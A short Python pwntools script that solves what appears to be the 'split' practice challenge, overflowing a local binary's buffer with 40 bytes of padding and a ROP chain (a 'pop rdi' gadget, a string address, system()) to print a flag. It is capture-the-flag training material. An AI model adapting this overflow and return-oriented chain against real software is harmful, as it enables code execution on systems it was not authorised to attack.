#!/usr/bin/env python
from pwn import *

#definitions
e = context.binary = ELF('./split', checksec=False)

#system_addr
system = p64(e.symbols.system)

#get_flag
get_flag = p64(e.symbols.usefulString)

#prefix
prefix = 40*'A'

#gadget
pop_rdi = p64(0x00000000004007c3)    #0x00000000004007c3: pop rdi; ret;

#exploit
io = process(e.path)
payload = prefix + pop_rdi + get_flag + system
io.sendline(payload)
io.recvuntil("> ")
io.recvline()
# Do some magic!!
flag = io.recvline()
print "Ta-daaamm: " + flag
